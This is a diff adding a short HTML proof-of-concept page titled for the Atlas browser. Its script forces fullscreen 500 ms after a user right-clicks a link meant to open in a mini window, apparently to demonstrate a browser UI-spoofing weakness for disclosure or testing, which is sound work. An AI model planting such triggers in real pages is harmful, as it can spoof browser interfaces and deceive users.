@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC Atlas Browser</title>
+</head>
+<body>
+
+<center>
+<a id="link" href="https://permission.site">Right-click - Open Link in in the mini window</a>
+</center >
+
+<script>
+const link = document.getElementById('link');
+
+link.addEventListener('contextmenu', () => {
+  setTimeout(() => {
+document.body.requestFullscreen();
+  }, 500);
+});
+
+
+</script>
+
+</body>
+</html>
